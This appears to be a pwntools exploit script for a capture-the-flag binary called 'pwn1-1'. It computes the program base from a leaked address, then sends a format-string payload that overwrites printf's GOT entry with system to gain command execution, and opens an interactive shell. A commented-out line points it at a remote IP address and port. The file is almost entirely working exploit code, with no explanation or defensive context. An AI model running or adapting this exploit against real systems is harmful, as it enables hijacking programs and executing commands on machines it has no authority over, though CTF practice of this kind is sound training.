from pwn import *

context(log_level='INFO', arch='amd64', os='linux')
context.terminal = "wt.exe -w main nt bash -c".split()

# sh = process(['./pwn1'])
sh = process(['./pwn1-1'])
# elf = ELF('./pwn1')
elf = ELF('./pwn1-1')
# sh = remote("172.51.65.174", 9999)

sh.sendlineafter(b"Welcome to mimic world,try something", b"1")

sh.recvuntil(b"You will find some tricks\n")
#  proc_base = int(sh.recvuntil(b"\n", drop=True).decode(), 16) - 0xa94
proc_base = int(sh.recvuntil(b"\n", drop=True).decode(), 16) - 0x12a0  # pwn1-1
print("proc_base >>> ", hex(proc_base))

sh.sendline(b"2")


payload = fmtstr_payload(8, {proc_base + elf.got['printf']: proc_base + elf.plt['system']})

sh.sendline(payload)

sh.interactive()